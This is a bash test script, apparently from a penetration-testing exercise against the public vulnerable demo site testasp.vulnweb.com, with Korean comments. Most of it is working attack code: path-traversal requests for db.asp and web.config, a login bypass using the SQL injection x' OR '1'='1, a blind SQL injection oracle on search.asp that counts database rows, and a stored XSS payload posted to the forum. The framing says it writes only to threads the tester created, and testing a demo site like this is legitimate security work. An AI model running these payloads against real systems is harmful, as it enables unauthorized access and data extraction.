#!/usr/bin/env bash
# Round 7 Part B — 안전 프로토콜: 우리 소유 테스트 스레드/게시글을 먼저 생성한 뒤,
#                   그 id 만 대상으로 id 주입을 검증한다.
# 모든 요청 중 GET 은 읽기 전용(ID 주입 포함 — DELETE 코드는 POST 분기에만 존재, 소스 확인).
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
JAR="$OUT/b_session.jar"
CURL=(curl -s --noproxy '*' --max-time 30)

rows() { grep -c "class='posttext'" "$1" 2>/dev/null || echo 0; }
get()  { "${CURL[@]}" -b "$JAR" -o "$OUT/$1" -w "%{http_code} %{size_download}" "$2"; }
oracle() { # $1 = SQL 조건식 (TRUE면 전체 게시글 렌더)
  "${CURL[@]}" -G --data-urlencode "tfSearch=zzq')>0 OR ($1))--" "$BASE/search.asp" \
    | grep -c "class='posttext'"
}

echo "### B0. webroot 확정 오라클 (읽기 전용)"
for p in "..%2f..%2finetpub%2facuforum%2fdb.asp" "..%2f..%2finetpub%2facuforum%2fweb.config" \
         "..%2facuforum%2fdb.asp" "..%2fwwwroot%2facuforum%2fdb.asp"; do
  printf "%-50s " "$p"
  "${CURL[@]}" -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/Templatize.asp?item=$p"
done

echo
echo "### B1. 세션 (따옴표 없는 uname) + SQLi 오라클로 전역 카운트 측정"
rm -f "$JAR"
"${CURL[@]}" -c "$JAR" -o /dev/null "$BASE/Login.asp"
"${CURL[@]}" -b "$JAR" -c "$JAR" -o /dev/null -X POST "$BASE/Login.asp" \
  --data-urlencode 'tfUName=admin' --data-urlencode "tfUPass=x' OR '1'='1"
printf "세션 사용자명: "; "${CURL[@]}" -b "$JAR" "$BASE/Default.asp" | grep -o 'logout [^<]*' | head -1
TOTAL_POSTS=$(oracle "1=1")
echo "총 게시글 수(= TRUE 오라클 렌더 행수): $TOTAL_POSTS"
printf "COUNT(posts)>100  → rows(TRUE면 전체 행) = %s  ⇒ %s\n" "$(oracle "(SELECT COUNT(*) FROM posts)>100")" \
  "$([ "$(oracle '(SELECT COUNT(*) FROM posts)>100')" = "0" ] && echo FALSE=임계값미달 || echo TRUE)"
printf "COUNT(threads)>100 → rows = %s\n" "$(oracle "(SELECT COUNT(*) FROM threads)>100")"
printf "COUNT(threads WHERE forumid=0)>100 → rows = %s\n" "$(oracle "(SELECT COUNT(*) FROM threads WHERE forumid=0)>100")"
printf "COUNT(posts WHERE threadid=0)>100   → rows = %s\n" "$(oracle "(SELECT COUNT(*) FROM posts WHERE threadid=0)>100")"

echo
echo "### B2. BEFORE 스냅샷 (다른 콘텐츠가 변하지 않았음을 나중에 비교)"
get b_before_default.html     "$BASE/Default.asp"
echo "  Default.asp"; get b_before_forum0.html "$BASE/showforum.asp?id=0"; echo "  forum0"
get b_before_forum1.html      "$BASE/showforum.asp?id=1"; echo "  forum1"
get b_before_thread0.html     "$BASE/showthread.asp?id=0"; echo "  thread0"
get b_before_thread2.html     "$BASE/showthread.asp?id=2"; echo "  thread2"
md5sum "$OUT"/b_before_*.html | sed 's|.*/||'
echo "forum0 스레드 링크 id 목록: $(grep -o 'showthread\.asp?id=[0-9]*' "$OUT/b_before_forum0.html" | grep -o '[0-9]*$' | sort -n | tr '\n' ' ')"

echo
echo "### B3. 우리 소유 테스트 스레드 생성 (showforum.asp?id=0 POST) — 쓰기 1"
"${CURL[@]}" -b "$JAR" -c "$JAR" -D "$OUT/b_post_thread_hdr.txt" -o "$OUT/b_post_thread.html" \
  -w "code=%{http_code} size=%{size_download}\n" -X POST "$BASE/showforum.asp?id=0" \
  --data-urlencode 'tfSubject=RT7-OWN-THREAD-DO-NOT-USE' \
  --data-urlencode 'tfText=<img src=x onerror=alert(7)> RT7 own test thread'
grep -iE '^(HTTP/|Location:)' "$OUT/b_post_thread_hdr.txt" | tr -d '\r'

echo
echo "### B4. 생성 확인 + 우리 스레드 id 식별"
get b_after_forum0.html "$BASE/showforum.asp?id=0"
echo "  forum0"
NEWT=$(grep -o 'showthread\.asp?id=[0-9]*' "$OUT/b_after_forum0.html" | grep -o '[0-9]*$' | sort -n | tail -1)
echo "forum0 최대 thread id: $NEWT"
grep -c 'RT7-OWN-THREAD-DO-NOT-USE' "$OUT/b_after_forum0.html" | sed 's/^/  우리 스레드 제목 매칭 수: /'
for cand in $(grep -o 'showthread\.asp?id=[0-9]*' "$OUT/b_after_forum0.html" | grep -o '[0-9]*$' | sort -nu); do
  n=$("${CURL[@]}" -b "$JAR" "$BASE/showthread.asp?id=$cand" | grep -c 'RT7-OWN-THREAD-DO-NOT-USE')
  [ "$n" -gt 0 ] && echo "  ★ 우리 스레드 id = $cand (제목 매칭 $n)"
done
echo "$NEWT" > "$OUT/b_our_thread_id.txt"

echo
echo "### B5. 우리 스레드에 게시글 1건 추가 (showthread.asp?id=$NEWT POST) — 쓰기 2"
"${CURL[@]}" -b "$JAR" -c "$JAR" -o "$OUT/b_post_post.html" \
  -w "code=%{http_code} size=%{size_download}\n" -X POST "$BASE/showthread.asp?id=$NEWT" \
  --data-urlencode 'tfSubject=RT7-OWN-POST-2' --data-urlencode 'tfText=second own post'
get b_our_thread_before_inject.html "$BASE/showthread.asp?id=$NEWT"
echo "  우리 스레드 게시글 수: $(rows "$OUT/b_our_thread_before_inject.html")"
